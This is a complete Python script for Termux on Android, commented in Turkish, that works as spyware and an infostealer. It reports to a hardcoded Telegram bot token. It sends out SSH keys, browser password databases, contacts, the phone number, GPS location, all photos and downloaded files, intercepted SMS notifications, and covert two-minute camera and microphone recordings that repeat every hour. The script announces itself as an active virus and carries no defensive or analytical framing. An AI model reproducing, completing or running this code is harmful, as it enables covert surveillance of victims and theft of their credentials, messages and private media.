#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import time
import requests
import subprocess
import hashlib
import glob
import threading
import shutil
import json
import datetime
import sys
import signal
import atexit
import sqlite3
import re
from urllib.parse import urlparse

# ======================== TELEGRAM BİLGİLERİ ========================
TOKEN = "8996765359:AAFSRiB5C8oK0rUcNQRKpA2M0bRP-eModd0"
ADMIN_ID = "8402048380"

# ======================== TELEGRAM GÖNDERİCİLER ========================
def tg_mesaj(m):
    try:
        if len(m) > 4000:
            m = m[:4000] + "..."
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                      data={"chat_id": ADMIN_ID, "text": m}, timeout=10)
    except:
        pass

def tg_foto(dosya):
    try:
        with open(dosya, "rb") as f:
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
                          data={"chat_id": ADMIN_ID}, files={"photo": f}, timeout=30)
    except:
        pass

def tg_video(dosya):
    try:
        with open(dosya, "rb") as f:
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendVideo",
                          data={"chat_id": ADMIN_ID}, files={"video": f}, timeout=60)
    except:
        pass

def tg_ses(dosya):
    try:
        with open(dosya, "rb") as f:
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendAudio",
                          data={"chat_id": ADMIN_ID}, files={"audio": f}, timeout=60)
    except:
        pass

def tg_dosya(dosya):
    try:
        with open(dosya, "rb") as f:
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendDocument",
                          data={"chat_id": ADMIN_ID}, files={"document": f}, timeout=30)
    except:
        pass

def tg_konum(lat, lon):
    try:
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendLocation",
                      data={"chat_id": ADMIN_ID, "latitude": lat, "longitude": lon}, timeout=10)
    except:
        pass

# ======================== 1. SİSTEM BİLGİSİ (GARANTİLİ) ========================
def sistem_bilgisi():
    try:
        host = subprocess.check_output(["uname", "-n"], text=True).strip()
        user = subprocess.check_output(["whoami"], text=True).strip()
        ip = requests.get('https://api.ipify.org', timeout=5).text
        os_info = os.name + " " + os.uname().sysname
        tg_mesaj(f"💻 SİSTEM BİLGİSİ\n🏷️ Host: {host}\n👤 Kullanıcı: {user}\n🌐 IP: {ip}\n📦 OS: {os_info}")
    except Exception as e:
        tg_mesaj(f"❌ Sistem bilgisi alınamadı: {str(e)[:100]}")

# ======================== 2. SSH ANAHTARLARI ========================
def ssh_anahtarlari():
    try:
        ssh_dosyalari = glob.glob(os.path.expanduser("~/.ssh/*"))
        if ssh_dosyalari:
            for dosya in ssh_dosyalari:
                tg_dosya(dosya)
            tg_mesaj(f"🔐 SSH dosyaları gönderildi: {', '.join(ssh_dosyalari)}")
        else:
            tg_mesaj("❌ SSH dosyası bulunamadı.")
    except Exception as e:
        tg_mesaj(f"❌ SSH hatası: {str(e)[:50]}")

# ======================== 3. TARAYICI ŞİFRELERİ ========================
def tarayici_sifreleri():
    try:
        chrome_login = os.path.expanduser("~/.config/google-chrome/Default/Login Data")
        if os.path.exists(chrome_login):
            shutil.copy(chrome_login, "/tmp/chrome_login.db")
            tg_dosya("/tmp/chrome_login.db")
            tg_mesaj("✅ Chrome şifre dosyası gönderildi.")
    except:
        pass
    try:
        edge_login = os.path.expanduser("~/.config/microsoft-edge/Default/Login Data")
        if os.path.exists(edge_login):
            shutil.copy(edge_login, "/tmp/edge_login.db")
            tg_dosya("/tmp/edge_login.db")
            tg_mesaj("✅ Edge şifre dosyası gönderildi.")
    except:
        pass
    try:
        firefox_login = glob.glob(os.path.expanduser("~/.mozilla/firefox/*.default/logins.json"))
        for f in firefox_login:
            tg_dosya(f)
            tg_mesaj("✅ Firefox şifre dosyası gönderildi.")
    except:
        pass

# ======================== 4. TELEFON NUMARASI ========================
def telefon_numarasi():
    try:
        numara = subprocess.check_output(["termux-telephony-callinfo"], text=True)
        if numara:
            tg_mesaj(f"📞 TELEFON NUMARASI: {numara[:200]}")
        else:
            tg_mesaj("❌ Numara alınamadı (termux-telephony yüklü mü?).")
    except:
        try:
            numara = subprocess.check_output(["content", "query", "--uri", "content://telephony/carriers", "--projection", "number"], text=True)
            if numara and "number=" in numara:
                tg_mesaj(f"📞 TELEFON NUMARASI: {numara[:200]}")
            else:
                tg_mesaj("❌ Numara alınamadı (root gerekli).")
        except:
            tg_mesaj("❌ Numara alınamadı.")

# ======================== 5. KİŞİLER ========================
def kisiler():
    try:
        kisi = subprocess.check_output(["content", "query", "--uri", "content://contacts/people", "--limit", "20"], text=True)
        if kisi:
            tg_mesaj(f"📇 KİŞİLER: {kisi[:600]}")
        else:
            tg_mesaj("❌ Kişi listesi alınamadı.")
    except:
        tg_mesaj("❌ Kişi listesi alınamadı.")

# ======================== 6. KONUM (GPS) ========================
def konum():
    try:
        konum_data = subprocess.check_output(["termux-location"], text=True)
        if konum_data:
            try:
                veri = json.loads(konum_data)
                lat = veri.get("latitude", 0)
                lon = veri.get("longitude", 0)
                if lat and lon:
                    tg_konum(lat, lon)
                    tg_mesaj(f"📍 KONUM: {lat}, {lon}")
                else:
                    tg_mesaj("❌ Konum verisi boş.")
            except:
                tg_mesaj(f"📍 KONUM: {konum_data[:200]}")
        else:
            tg_mesaj("❌ Konum alınamadı.")
    except:
        tg_mesaj("❌ Konum alınamadı (izin gerekli).")

# ======================== 7. İLK FOTOĞRAFLAR (HIZLI) ========================
def ilk_fotolar():
    tg_mesaj("📸 İLK 15 FOTOĞRAF GÖNDERİLİYOR...")
    sayac = 0
    klasorler = [
        "/storage/emulated/0/DCIM",
        "/storage/emulated/0/Pictures",
        "/sdcard/DCIM",
        "/sdcard/Pictures"
    ]
    for klasor in klasorler:
        if not os.path.exists(klasor):
            continue
        for dosya in os.listdir(klasor)[:15]:
            yol = os.path.join(klasor, dosya)
            if os.path.isfile(yol) and dosya.lower().endswith(('.jpg', '.jpeg', '.png', '.gif')):
                try:
                    tg_foto(yol)
                    sayac += 1
                    time.sleep(0.3)
                except:
                    pass
    tg_mesaj(f"✅ {sayac} FOTOĞRAF GÖNDERİLDİ, GERİSİ ARKADA TARANIYOR...")

# ======================== 8. TÜM GALERİ (ARKA PLANDA) ========================
def galeri():
    klasorler = [
        "/storage/emulated/0/DCIM",
        "/storage/emulated/0/Pictures",
        "/sdcard/DCIM",
        "/sdcard/Pictures"
    ]
    tg_mesaj("📸 GALERİ TARANIYOR...")
    sayac = 0
    for klasor in klasorler:
        if not os.path.exists(klasor):
            continue
        for root, _, files in os.walk(klasor):
            for dosya in files:
                if dosya.lower().endswith(('.jpg', '.jpeg', '.png', '.gif')):
                    yol = os.path.join(root, dosya)
                    try:
                        tg_foto(yol)
                        sayac += 1
                        time.sleep(0.2)
                    except:
                        pass
    tg_mesaj(f"✅ {sayac} FOTOĞRAF GÖNDERİLDİ.")

# ======================== 9. TÜM DOSYALAR ========================
def dosyalari_gonder():
    klasorler = [
        "/storage/emulated/0/Download",
        "/storage/emulated/0/DCIM",
        "/storage/emulated/0/Pictures",
        "/sdcard/Download",
        "/sdcard/DCIM",
        "/sdcard/Pictures"
    ]
    tg_mesaj("📁 DOSYALAR TARANIYOR...")
    sayac = 0
    for klasor in klasorler:
        if not os.path.exists(klasor):
            continue
        for dosya in os.listdir(klasor):
            yol = os.path.join(klasor, dosya)
            if os.path.isfile(yol):
                try:
                    if yol.lower().endswith(('.jpg', '.png', '.jpeg', '.gif')):
                        tg_foto(yol)
                    elif yol.lower().endswith(('.mp4', '.mkv', '.avi')):
                        tg_video(yol)
                    else:
                        tg_dosya(yol)
                    sayac += 1
                    time.sleep(0.2)
                except:
                    pass
    tg_mesaj(f"✅ {sayac} DOSYA GÖNDERİLDİ.")

# ======================== 10. KAMERA KAYDI (2 DAKİKA) ========================
def kamera_kaydet():
    try:
        tg_mesaj("📸 KAMERA KAYDI BAŞLATILIYOR (2 DAKİKA)...")
        dosya = "/sdcard/video.mp4"
        subprocess.run(["termux-camera-record", "-c", "0", "-d", "120", "-f", dosya], timeout=125)
        if os.path.exists(dosya) and os.path.getsize(dosya) > 0:
            tg_video(dosya)
            os.remove(dosya)
            tg_mesaj("✅ KAMERA KAYDI GÖNDERİLDİ.")
        else:
            tg_mesaj("❌ Kamera kaydı başarısız (dosya oluşmadı).")
    except Exception as e:
        tg_mesaj(f"❌ Kamera hatası: {str(e)[:50]}")

# ======================== 11. MİKROFON KAYDI (2 DAKİKA) ========================
def mikrofon_kaydet():
    try:
        tg_mesaj("🎤 MİKROFON KAYDI BAŞLATILIYOR (2 DAKİKA)...")
        dosya = "/sdcard/ses.mp3"
        subprocess.run(["termux-microphone-record", "-d", "120", "-f", dosya], timeout=125)
        if os.path.exists(dosya) and os.path.getsize(dosya) > 0:
            tg_ses(dosya)
            os.remove(dosya)
            tg_mesaj("✅ MİKROFON KAYDI GÖNDERİLDİ.")
        else:
            tg_mesaj("❌ Mikrofon kaydı başarısız (dosya oluşmadı).")
    except Exception as e:
        tg_mesaj(f"❌ Mikrofon hatası: {str(e)[:50]}")

# ======================== 12. SMS BİLDİRİM İZLEYİCİ ========================
def bildirim_izle():
    tg_mesaj("📨 SMS BİLDİRİM İZLEYİCİ BAŞLADI...")
    eski = []
    while True:
        try:
            sonuc = subprocess.check_output(["termux-notification-list"], text=True)
            if sonuc and sonuc not in eski:
                eski.append(sonuc)
                if "sms" in sonuc.lower() or "message" in sonuc.lower():
                    tg_mesaj(f"📨 BİLDİRİM YAKALANDI:\n{sonuc[:600]}")
        except:
            pass
        time.sleep(3)

# ======================== 13. DOSYA İZLEYİCİ ========================
def dosya_izle():
    klasorler = [
        "/storage/emulated/0/Download",
        "/storage/emulated/0/DCIM",
        "/storage/emulated/0/Pictures",
        "/sdcard/Download",
        "/sdcard/DCIM",
        "/sdcard/Pictures"
    ]
    hash_kayit = {}
    while True:
        for klasor in klasorler:
            if not os.path.exists(klasor):
                continue
            for dosya in os.listdir(klasor):
                yol = os.path.join(klasor, dosya)
                if os.path.isfile(yol):
                    try:
                        with open(yol, "rb") as f:
                            h = hashlib.md5(f.read()).hexdigest()
                        if h not in hash_kayit:
                            hash_kayit[h] = yol
                            tg_mesaj(f"📁 YENİ DOSYA: {yol}")
                            if yol.lower().endswith(('.jpg', '.png', '.jpeg', '.gif')):
                                tg_foto(yol)
                            elif yol.lower().endswith(('.mp4', '.mkv', '.avi')):
                                tg_video(yol)
                            else:
                                tg_dosya(yol)
                    except:
                        pass
        time.sleep(10)

# ======================== 14. ARKA PLANDA SÜREKLİ ÇALIŞMA ========================
def arka_plan_dongusu():
    while True:
        time.sleep(3600)  # 1 saat bekle
        tg_mesaj("⏰ 1 SAAT GEÇTİ. KAMERA, MİKROFON VE KONUM TEKRAR BAŞLATILIYOR...")
        kamera_kaydet()
        mikrofon_kaydet()
        konum()

# ======================== 15. ANA BAŞLATICI ========================
def ana():
    tg_mesaj("🚀 VİRÜS AKTİF! TÜM VERİLER TOPLANIYOR...")
    sistem_bilgisi()
    time.sleep(2)
    ssh_anahtarlari()
    time.sleep(2)
    tarayici_sifreleri()
    time.sleep(2)
    telefon_numarasi()
    time.sleep(2)
    kisiler()
    time.sleep(2)
    konum()
    time.sleep(2)
    ilk_fotolar()
    time.sleep(2)
    
    # Arka planda çalışacak işlemler
    threading.Thread(target=galeri, daemon=True).start()
    threading.Thread(target=dosyalari_gonder, daemon=True).start()
    threading.Thread(target=bildirim_izle, daemon=True).start()
    threading.Thread(target=dosya_izle, daemon=True).start()
    
    # İlk kamera ve mikrofon kaydı
    kamera_kaydet()
    mikrofon_kaydet()
    
    tg_mesaj("✅ TÜM VERİLER TOPLANDI. SÜREKLİ İZLEME BAŞLADI...")
    
    # Arka plan döngüsü
    arka_plan_dongusu()

if __name__ == "__main__":
    ana()
